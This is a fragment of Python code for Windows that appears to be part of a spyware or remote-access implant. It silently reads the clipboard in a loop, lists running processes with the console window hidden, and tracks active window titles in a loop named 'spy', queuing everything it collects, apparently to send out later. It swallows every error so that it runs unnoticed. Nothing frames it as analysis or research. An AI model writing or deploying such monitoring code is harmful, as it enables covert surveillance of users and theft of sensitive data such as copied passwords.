def f_clip_get():
    try:
        u = ctypes.windll.user32
        k = ctypes.windll.kernel32
        u.OpenClipboard(None)
        h = u.GetClipboardData(13)
        p = k.GlobalLock(h)
        txt = ctypes.wstring_at(p) if p else ""
        k.GlobalUnlock(h)
        u.CloseClipboard()
        return txt
    except Exception:
        return ""


def f_clip_loop():
    global g_clip
    while G.get("run"):
        try:
            t = f_clip_get()
            if t and t != g_clip:
                g_clip = t
                f_queue({"t": "clip", "ts": int(time.time())}, t[:20000].encode("utf-8", "replace"))
        except Exception:
            pass
        time.sleep(CFG["clipbuf"])


def f_procs():
    try:
        return subprocess.run(["tasklist", "/fo", "csv", "/nh"], capture_output=True, text=True,
                              timeout=20, creationflags=0x08000000).stdout[:200000]
    except Exception:
        return ""


def f_spy_loop():
    last = ""
    while G.get("run"):
        try:
            w = f_win()
            if w and w != last:
                last = w
                f_queue({"t": "win", "ts": int(time.time())}, w.encode("utf-8", "replace"))
        except Exception:
            pass
        time.sleep(3)
